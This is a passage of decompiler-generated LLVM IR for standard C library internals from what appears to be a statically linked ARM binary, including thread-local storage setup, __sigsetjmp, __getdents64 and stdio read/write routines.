  store i32 %v18_17948, i32* %sb.global-to-local, align 4
  store i32 %v21_17948, i32* %sl.global-to-local, align 4
  store i32 %v24_17948, i32* %fp.global-to-local, align 4
  store i32 %v27_17948, i32* @lr, align 4
  %v0_17b30 = call i32 @init_static_tls()
  store i32 %v0_17b30, i32* %r0.global-to-local, align 4
  %v0_17b3c.pre = load i32, i32* @ip, align 4
  %v1_17a04.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17a14.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_179c0.dec_label_pc_17b34.loopexit_crit_edge: ; preds = %dec_label_pc_179bc
  br label %dec_label_pc_17b34.loopexit

dec_label_pc_17b34.loopexit:                      ; preds = %dec_label_pc_179c0.dec_label_pc_17b34.loopexit_crit_edge, %dec_label_pc_17974
  br label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b34.loopexit, %entry, %bb55
  %v0_17a14.pre.pre = phi i32 [ ptrtoint (i32* @global_var_21d10.338 to i32), %dec_label_pc_17b34.loopexit ], [ ptrtoint (i32* @global_var_21d10.338 to i32), %entry ], [ %v0_17a14.pre.pre.pre, %bb55 ]
  %v1_17a04.pre.pre = phi i32 [ %v0_17968, %dec_label_pc_17b34.loopexit ], [ %v0_17968, %entry ], [ %v1_17a04.pre.pre.pre, %bb55 ]
  %v0_17b3c = phi i32 [ %v0_1796c, %dec_label_pc_17b34.loopexit ], [ %v0_1796c, %entry ], [ %v0_17b3c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_17b3c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17a00

; uselistorder directives
  uselistorder i32 %v0_17b3c, { 1, 0 }
  uselistorder i32 %v1_17af0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17a5c, { 1, 0 }
  uselistorder i32 %v2_17a58, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_179bc, { 2, 1, 0 }
  uselistorder i32 %v3_17994, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1799c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_179c0, { 1, 0 }
  uselistorder i32 %v0_1796c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17968, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1795c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17b34, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17a04, { 1, 0 }
  uselistorder label %dec_label_pc_17a00, { 1, 0 }
  uselistorder label %dec_label_pc_17984, { 1, 0 }
}

define i32 @function_17b54(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17b54:
  %v0_17b54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b54, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_17b54
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_17b54
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_17b80 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_17b80
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v4_17b90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 156) to i32*), align 4
  %v4_17b98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 104) to i32*), align 4
  store i32 %v4_17b98, i32* %r1.global-to-local, align 4
  %v1_17b9c = add i32 %arg1, 44
  %v2_17b9c = inttoptr i32 %v1_17b9c to i32*
  %v3_17b9c = load i32, i32* %v2_17b9c, align 4
  %v1_17ba0 = add i32 %arg1, 28
  %v2_17ba0 = inttoptr i32 %v1_17ba0 to i32*
  %v3_17ba0 = load i32, i32* %v2_17ba0, align 4
  store i32 %v3_17ba0, i32* %r2.global-to-local, align 4
  %v2_17ba4 = inttoptr i32 %v4_17b90 to i32*
  store i32 %v3_17b9c, i32* %v2_17ba4, align 4
  %v0_17ba8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ba8 = load i32, i32* %r1.global-to-local, align 4
  %v2_17ba8 = inttoptr i32 %v1_17ba8 to i32*
  store i32 %v0_17ba8, i32* %v2_17ba8, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17bb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_17bb4:
  %v0_17bb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17bb4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17bb4
  %v1_17bb4 = load i32, i32* @ip, align 4
  %v3_17bb4 = mul i32 %v1_17bb4, %arg1
  %v2_17bb8 = load i32, i32* @r8, align 4
  %v4_17bb8 = and i32 %v2_17bb8, %v3_17bb4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17bb4, %bb
  %v5_17bb8 = phi i32 [ %arg1, %dec_label_pc_17bb4 ], [ %v4_17bb8, %bb ]
  ret i32 %v5_17bb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17bc4 = add i32 %arg1, 40
  store i32 %v1_17bc4, i32* %r2.global-to-local, align 4
  %v1_17bc8 = inttoptr i32 %v1_17bc4 to i32*
  %v2_17bc8 = load i32, i32* %v1_17bc8, align 4
  store i32 %v2_17bc8, i32* %r2.global-to-local, align 4
  %v3_17bc8 = add i32 %arg1, 44
  %v4_17bc8 = inttoptr i32 %v3_17bc8 to i32*
  %v5_17bc8 = load i32, i32* %v4_17bc8, align 4
  store i32 %v5_17bc8, i32* %r3.global-to-local, align 4
  %v0_17bcc = call i32 @__aeabi_read_tp()
  %v1_17bd0 = inttoptr i32 %v0_17bcc to i32*
  %v2_17bd0 = load i32, i32* %v1_17bd0, align 4
  store i32 %v2_17bd0, i32* %r1.global-to-local, align 4
  %v3_17bd4 = mul i32 %v5_17bc8, 8
  store i32 %v3_17bd4, i32* %r3.global-to-local, align 4
  %v1_17bd8 = load i32, i32* %r2.global-to-local, align 4
  %v2_17bd8 = add i32 %v1_17bd8, %v0_17bcc
  %v3_17bdc = add i32 %v3_17bd4, %v2_17bd0
  %v4_17bdc = inttoptr i32 %v3_17bdc to i32*
  store i32 %v2_17bd8, i32* %v4_17bdc, align 4
  %v0_17be0 = load i32, i32* %r3.global-to-local, align 4
  %v1_17be0 = load i32, i32* %r1.global-to-local, align 4
  %v2_17be0 = add i32 %v1_17be0, %v0_17be0
  store i32 %v2_17be0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17be8 = add i32 %v2_17be0, 4
  %v5_17be8 = inttoptr i32 %v4_17be8 to i8*
  store i8 1, i8* %v5_17be8, align 1
  %v0_17bec = load i32, i32* @r4, align 4
  %v1_17bec = add i32 %v0_17bec, 20
  store i32 %v1_17bec, i32* %r1.global-to-local, align 4
  %v1_17bf0 = inttoptr i32 %v1_17bec to i32*
  %v2_17bf0 = load i32, i32* %v1_17bf0, align 4
  store i32 %v2_17bf0, i32* @r1, align 4
  %v3_17bf0 = add i32 %v0_17bec, 24
  %v4_17bf0 = inttoptr i32 %v3_17bf0 to i32*
  %v5_17bf0 = load i32, i32* %v4_17bf0, align 4
  store i32 %v5_17bf0, i32* %r2.global-to-local, align 4
  %v5_17bf4 = call i32 @__GI_mempcpy(i32 %v2_17bd8, i32 %v2_17bf0, i32 %v5_17bf0, i32 1)
  %v0_17bf8 = load i32, i32* @r4, align 4
  %v1_17bf8 = add i32 %v0_17bf8, 28
  store i32 %v1_17bf8, i32* %r3.global-to-local, align 4
  %v1_17bfc = inttoptr i32 %v1_17bf8 to i32*
  %v2_17bfc = load i32, i32* %v1_17bfc, align 4
  store i32 %v2_17bfc, i32* %r2.global-to-local, align 4
  %v3_17bfc = add i32 %v0_17bf8, 24
  %v4_17bfc = inttoptr i32 %v3_17bfc to i32*
  %v5_17bfc = load i32, i32* %v4_17bfc, align 4
  store i32 %v5_17bfc, i32* %r3.global-to-local, align 4
  %v2_17c00 = sub i32 %v5_17bfc, %v2_17bfc
  store i32 %v2_17c00, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17c08 = inttoptr i32 %v5_17bf4 to i8*
  %v4_17c08 = call i32 @__GI_memset(i8* %v3_17c08, i32 0, i32 %v2_17c00)
  ret i32 %v4_17c08

; uselistorder directives
  uselistorder i32 %v3_17bd4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_17c58:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_17c6c = load i32, i32* @r0, align 4
  %v1_17c70 = inttoptr i32 %v0_17c6c to i32*
  %v2_17c70 = load i32, i32* @r4, align 4
  store i32 %v2_17c70, i32* %v1_17c70, align 4
  %v3_17c70 = add i32 %v0_17c6c, 4
  %v4_17c70 = inttoptr i32 %v3_17c70 to i32*
  %v5_17c70 = load i32, i32* @r5, align 4
  store i32 %v5_17c70, i32* %v4_17c70, align 4
  %v6_17c70 = add i32 %v0_17c6c, 8
  %v7_17c70 = inttoptr i32 %v6_17c70 to i32*
  %v8_17c70 = load i32, i32* @r6, align 4
  store i32 %v8_17c70, i32* %v7_17c70, align 4
  %v9_17c70 = add i32 %v0_17c6c, 12
  %v10_17c70 = inttoptr i32 %v9_17c70 to i32*
  %v11_17c70 = load i32, i32* @r7, align 4
  store i32 %v11_17c70, i32* %v10_17c70, align 4
  %v12_17c70 = add i32 %v0_17c6c, 16
  %v13_17c70 = inttoptr i32 %v12_17c70 to i32*
  %v14_17c70 = load i32, i32* @r8, align 4
  store i32 %v14_17c70, i32* %v13_17c70, align 4
  %v15_17c70 = add i32 %v0_17c6c, 20
  %v16_17c70 = inttoptr i32 %v15_17c70 to i32*
  %v17_17c70 = load i32, i32* @sb, align 4
  store i32 %v17_17c70, i32* %v16_17c70, align 4
  %v18_17c70 = add i32 %v0_17c6c, 24
  %v19_17c70 = inttoptr i32 %v18_17c70 to i32*
  %v20_17c70 = load i32, i32* @sl, align 4
  store i32 %v20_17c70, i32* %v19_17c70, align 4
  %v21_17c70 = add i32 %v0_17c6c, 28
  %v22_17c70 = inttoptr i32 %v21_17c70 to i32*
  %v23_17c70 = load i32, i32* @fp, align 4
  store i32 %v23_17c70, i32* %v22_17c70, align 4
  %v24_17c70 = add i32 %v0_17c6c, 32
  %v25_17c70 = inttoptr i32 %v24_17c70 to i32*
  %v27_17c70 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_17c70, i32* %v25_17c70, align 4
  %v28_17c70 = add i32 %v0_17c6c, 36
  %v29_17c70 = inttoptr i32 %v28_17c70 to i32*
  %v30_17c70 = load i32, i32* @lr, align 4
  store i32 %v30_17c70, i32* %v29_17c70, align 4
  %v0_17c74 = call i32 @__sigjmp_save()
  ret i32 %v0_17c74

; uselistorder directives
  uselistorder i32 %v0_17c6c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 107, 108, 14, 15, 16, 17, 18, 19, 20, 21, 95, 96, 97, 98, 99, 101, 100, 102, 0, 31, 32, 33, 34, 35, 36, 37, 4, 1, 2, 3, 5, 6, 7, 8, 9, 39, 38, 44, 45, 40, 41, 42, 43, 22, 23, 24, 25, 26, 27, 28, 29, 30, 46, 47, 48, 49, 50, 51, 52, 53, 10, 11, 12, 13, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 67, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 85, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 103, 104, 105, 106, 109 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_17c7c = load i32, i32* @r5, align 4
  %v12_17c7c = load i32, i32* @r7, align 4
  %v1_17c80 = add i32 %arg3, 14
  %v2_17c88 = ptrtoint i32* %stack_var_-72 to i32
  %v1_17c8c = and i32 %v1_17c80, -8
  %v2_17c90 = sub i32 %v2_17c88, %v1_17c8c
  %v1_17c94 = add i32 %v2_17c90, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17cd8, label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %entry
  %v1_17cc0 = sub i32 0, %arg1
  %v3_17cc4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_17cc4 = sext i16 %v3_17cc4 to i32
  %v0_17cc8 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17cd0 = add i32 %v4_17cc4, %v0_17cc8
  %v4_17cd0 = inttoptr i32 %v3_17cd0 to i32*
  store i32 %v1_17cc0, i32* %v4_17cd0, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17cd8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17da8, label %dec_label_pc_17ce0

dec_label_pc_17ce0:                               ; preds = %dec_label_pc_17cd8
  %v2_17ce0 = add i32 %v1_17c94, %arg1
  store i32 %v2_17ce0, i32* %r1.global-to-local, align 4
  %v2_17ce4 = add i32 %tmp, %arg3
  store i32 %v1_17c94, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17d90

dec_label_pc_17d00:                               ; preds = %dec_label_pc_17d90
  %v1_17d00 = add i32 %v0_17d60, 16
  %v2_17d00 = inttoptr i32 %v1_17d00 to i16*
  %v3_17d00 = load i16, i16* %v2_17d00, align 2
  %v4_17d00 = zext i16 %v3_17d00 to i32
  %v1_17d04 = add nsw i32 %v4_17d00, -19
  store i32 %v1_17d04, i32* @r2, align 4
  %v1_17d08 = add nuw nsw i32 %v4_17d00, 7
  %v1_17d0c = and i32 %v1_17d08, 131064
  store i32 %v1_17d0c, i32* @ip, align 4
  %v2_17d14 = add i32 %v1_17d0c, %v0_17d68
  store i32 %v2_17d14, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17d14, %v2_17ce4
  br i1 %tmp24, label %dec_label_pc_17d20, label %dec_label_pc_17d5c

dec_label_pc_17d20:                               ; preds = %dec_label_pc_17d00
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17d28 = load i32, i32* %r8.global-to-local, align 4
  %v0_17d2c = load i32, i32* %sb.global-to-local, align 4
  %v1_17d30 = load i32, i32* @sp, align 4
  %v2_17d30 = inttoptr i32 %v1_17d30 to i32*
  store i32 0, i32* %v2_17d30, align 4
  %v4_17d34 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17d28, i32 %v0_17d2c)
  %v0_17d38 = load i32, i32* @r5, align 4
  %v1_17d38 = load i32, i32* %sl.global-to-local, align 4
  %v9_17d38 = icmp eq i32 %v0_17d38, %v1_17d38
  br i1 %v9_17d38, label %dec_label_pc_17d40, label %dec_label_pc_17da4

dec_label_pc_17d40:                               ; preds = %dec_label_pc_17d20
  %v0_17d44 = call i32 @__aeabi_read_tp()
  %v3_17d48 = load i16, i16* @global_var_21d68.334, align 2
  %v4_17d48 = sext i16 %v3_17d48 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17d54 = add i32 %v4_17d48, %v0_17d44
  %v4_17d54 = inttoptr i32 %v3_17d54 to i32*
  store i32 22, i32* %v4_17d54, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17d5c:                               ; preds = %dec_label_pc_17d00
  %v1_17d5c = inttoptr i32 %v0_17d60 to i32*
  %v2_17d5c = load i32, i32* %v1_17d5c, align 4
  %v3_17d5c = add i32 %v0_17d60, 4
  %v4_17d5c = inttoptr i32 %v3_17d5c to i32*
  %v5_17d5c = load i32, i32* %v4_17d5c, align 4
  store i32 %v5_17d5c, i32* @r4, align 4
  %v1_17d60 = add i32 %v0_17d60, 8
  store i32 %v1_17d60, i32* %r8.global-to-local, align 4
  %v1_17d64 = inttoptr i32 %v1_17d60 to i32*
  %v2_17d64 = load i32, i32* %v1_17d64, align 4
  store i32 %v2_17d64, i32* %r8.global-to-local, align 4
  %v3_17d64 = add i32 %v0_17d60, 12
  %v4_17d64 = inttoptr i32 %v3_17d64 to i32*
  %v5_17d64 = load i32, i32* %v4_17d64, align 4
  store i32 %v5_17d64, i32* %sb.global-to-local, align 4
  %v1_17d68 = inttoptr i32 %v0_17d68 to i32*
  store i32 %v2_17d5c, i32* %v1_17d68, align 4
  %v3_17d68 = add i32 %v0_17d68, 4
  %v4_17d68 = inttoptr i32 %v3_17d68 to i32*
  %v5_17d68 = load i32, i32* @r4, align 4
  store i32 %v5_17d68, i32* %v4_17d68, align 4
  %v0_17d6c = load i32, i32* %r8.global-to-local, align 4
  %v1_17d6c = load i32, i32* @r5, align 4
  %v2_17d6c = add i32 %v1_17d6c, 8
  %v3_17d6c = inttoptr i32 %v2_17d6c to i32*
  store i32 %v0_17d6c, i32* %v3_17d6c, align 4
  %v0_17d70 = load i32, i32* %sb.global-to-local, align 4
  %v1_17d70 = load i32, i32* @r5, align 4
  %v2_17d70 = add i32 %v1_17d70, 12
  %v3_17d70 = inttoptr i32 %v2_17d70 to i32*
  store i32 %v0_17d70, i32* %v3_17d70, align 4
  %v0_17d74 = load i32, i32* @ip, align 4
  %v1_17d74 = trunc i32 %v0_17d74 to i16
  %v2_17d74 = load i32, i32* @r5, align 4
  %v3_17d74 = add i32 %v2_17d74, 16
  %v4_17d74 = inttoptr i32 %v3_17d74 to i16*
  store i16 %v1_17d74, i16* %v4_17d74, align 2
  %v0_17d78 = load i32, i32* @r7, align 4
  %v1_17d78 = add i32 %v0_17d78, 18
  %v2_17d78 = inttoptr i32 %v1_17d78 to i8*
  %v3_17d78 = load i8, i8* %v2_17d78, align 1
  %v4_17d78 = zext i8 %v3_17d78 to i32
  store i32 %v4_17d78, i32* @r3, align 4
  %v2_17d7c = load i32, i32* @r5, align 4
  %v3_17d7c = add i32 %v2_17d7c, 18
  %v4_17d7c = inttoptr i32 %v3_17d7c to i8*
  store i8 %v3_17d78, i8* %v4_17d7c, align 1
  %v0_17d80 = call i32 @memcpy()
  %v0_17d84 = load i32, i32* @r7, align 4
  %v1_17d84 = add i32 %v0_17d84, 16
  %v2_17d84 = inttoptr i32 %v1_17d84 to i16*
  %v3_17d84 = load i16, i16* %v2_17d84, align 2
  %v4_17d84 = zext i16 %v3_17d84 to i32
  %v0_17d88 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17d88, i32* @r5, align 4
  %v2_17d8c = add i32 %v4_17d84, %v0_17d84
  store i32 %v2_17d8c, i32* @r7, align 4
  br label %dec_label_pc_17d90

dec_label_pc_17d90:                               ; preds = %dec_label_pc_17ce0, %dec_label_pc_17d5c
  %v0_17d68 = phi i32 [ %tmp, %dec_label_pc_17ce0 ], [ %v0_17d88, %dec_label_pc_17d5c ]
  %v0_17d60 = phi i32 [ %v1_17c94, %dec_label_pc_17ce0 ], [ %v2_17d8c, %dec_label_pc_17d5c ]
  %v3_17d94 = icmp ult i32 %v0_17d60, %v2_17ce0
  %v1_17d98 = add i32 %v0_17d68, 19
  store i32 %v1_17d98, i32* @r0, align 4
  %v1_17d9c = add i32 %v0_17d60, 19
  store i32 %v1_17d9c, i32* @r1, align 4
  br i1 %v3_17d94, label %dec_label_pc_17d00, label %dec_label_pc_17da4.loopexit

dec_label_pc_17da4.loopexit:                      ; preds = %dec_label_pc_17d90
  %v0_17da4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17da4

dec_label_pc_17da4:                               ; preds = %dec_label_pc_17da4.loopexit, %dec_label_pc_17d20
  %v1_17da4 = phi i32 [ %v0_17d68, %dec_label_pc_17da4.loopexit ], [ %v0_17d38, %dec_label_pc_17d20 ]
  %v0_17da4 = phi i32 [ %v0_17da4.pre, %dec_label_pc_17da4.loopexit ], [ %v1_17d38, %dec_label_pc_17d20 ]
  %v2_17da4 = sub i32 %v1_17da4, %v0_17da4
  store i32 %v2_17da4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17da8

dec_label_pc_17da8:                               ; preds = %dec_label_pc_17cd8, %dec_label_pc_17d40, %dec_label_pc_17cbc, %dec_label_pc_17da4
  %v0_17da8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_17c7c, i32* @r5, align 4
  store i32 %v12_17c7c, i32* @r7, align 4
  ret i32 %v0_17da8

; uselistorder directives
  uselistorder i32 %v0_17d60, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17d68, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17c94, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 8, 9, 0, 3, 10, 4, 11, 12, 5, 6, 7, 1, 13, 2, 14 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 9, 2, 3, 4, 5, 6, 10, 11, 7, 8 }
  uselistorder i32* @sp, { 3, 2, 4, 0, 5, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_17da8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17d90, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17dc0 = load i32, i32* @r4, align 4
  store i32 %v3_17dc0, i32* %stack_var_-12, align 4
  %v0_17dc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_17dc4 = inttoptr i32 %v0_17dc4 to i16*
  %v2_17dc4 = load i16, i16* %v1_17dc4, align 2
  %v3_17dc4 = zext i16 %v2_17dc4 to i32
  store i32 %v3_17dc4, i32* @r3, align 4
  %v1_17dc8 = and i32 %v3_17dc4, 4
  store i32 %v1_17dc8, i32* @r5, align 4
  %v2_17dc8 = icmp eq i32 %v1_17dc8, 0
  store i32 %v0_17dc4, i32* @r4, align 4
  br i1 %v2_17dc8, label %dec_label_pc_17ddc, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_17ddc:                               ; preds = %entry
  %v1_17ddc = icmp slt i32 %arg2, 0
  br i1 %v1_17ddc, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_17ddc
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_17ddc, %bb18
  %v1_17de4 = add i32 %v0_17dc4, 4
  %v2_17de4 = inttoptr i32 %v1_17de4 to i32*
  %v3_17de4 = load i32, i32* %v2_17de4, align 4
  store i32 %v3_17de4, i32* %r0.global-to-local, align 4
  %v1_17de8 = call i32 @__libc_read(i32 %v3_17de4)
  store i32 %v1_17de8, i32* %r0.global-to-local, align 4
  %v5_17df0 = icmp sgt i32 %v1_17de8, 0
  br i1 %v5_17df0, label %.thread7, label %dec_label_pc_17df4

dec_label_pc_17df4:                               ; preds = %bb19
  %v2_17dec = icmp eq i32 %v1_17de8, 0
  %v0_17df4 = load i32, i32* @r4, align 4
  %v1_17df4 = inttoptr i32 %v0_17df4 to i16*
  %v2_17df4 = load i16, i16* %v1_17df4, align 2
  br i1 %v2_17dec, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17df4
  %v2_17df8 = or i16 %v2_17df4, 4
  store i16 %v2_17df8, i16* %v1_17df4, align 2
  %v1_17e14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17df4
  %v2_17dfc = or i16 %v2_17df4, 8
  store i16 %v2_17dfc, i16* %v1_17df4, align 2
  %v1_17e08 = load i32, i32* @r5, align 4
  store i32 %v1_17e08, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17e14 = phi i32 [ %v1_17e14.pre, %bb20 ], [ 0, %bb ], [ %v1_17de8, %bb19 ], [ %v1_17e08, %bb21 ]
  %v2_17e10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17e10, i32* @r4, align 4
  ret i32 %v1_17e14

; uselistorder directives
  uselistorder i16 %v2_17df4, { 1, 0 }
  uselistorder i32 %v1_17de8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_17edc2 = icmp eq i32 %arg3, 0
  store i1 %v2_17edc2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17edc2, label %dec_label_pc_17ee4, label %dec_label_pc_17e34

dec_label_pc_17e34:                               ; preds = %entry, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge
  %v0_17e40 = phi i32 [ %v0_17e40.pre, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge ], [ %tmp, %entry ]
  %v0_17e3c = phi i32 [ %v5_17e4c, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge ], [ %arg2, %entry ]
  %v3_17e34 = phi i32 [ %v3_17e34.pre, %dec_label_pc_17edcthread-pre-split.dec_label_pc_17e34_crit_edge ], [ 2147483647, %entry ]
